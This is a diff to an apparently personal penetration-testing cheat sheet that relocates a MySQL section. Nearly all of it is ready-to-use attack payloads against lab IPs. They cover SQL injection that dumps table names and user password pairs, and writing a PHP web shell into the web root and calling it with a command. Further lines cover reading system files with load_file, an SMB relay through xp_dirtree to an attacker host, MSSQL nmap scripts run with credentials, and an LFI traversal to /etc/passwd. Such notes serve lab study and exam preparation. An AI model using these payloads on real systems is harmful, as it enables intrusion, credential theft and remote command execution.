@@ -256,7 +256,19 @@ Queries
 - Load file:  
   `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 
 
-MSSQL 
+MySQL 
+- Enumerate tables:  
+  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
+- Get columns of specific table:  
+  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
+- Get content of table:  
+  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
+- Create new php file with cmd.exe:  
+  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
+- Use the new page with params:  
+  `http://10.11.14.101/backdoor.php?cmd=whoami`  
+
+## MSSQL    
 - Nmap scripts with db credentials:  
   `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
 - Impacket mssqlclient.py:   
@@ -279,18 +291,6 @@ MSSQL
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
-  
-MySQL 
-- Enumerate tables:  
-  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
-- Get columns of specific table:  
-  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
-- Get content of table:  
-  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
-- Create new php file with cmd.exe:  
-  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
-- Use the new page with params:  
-  `http://10.11.14.101/backdoor.php?cmd=whoami`  
 
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
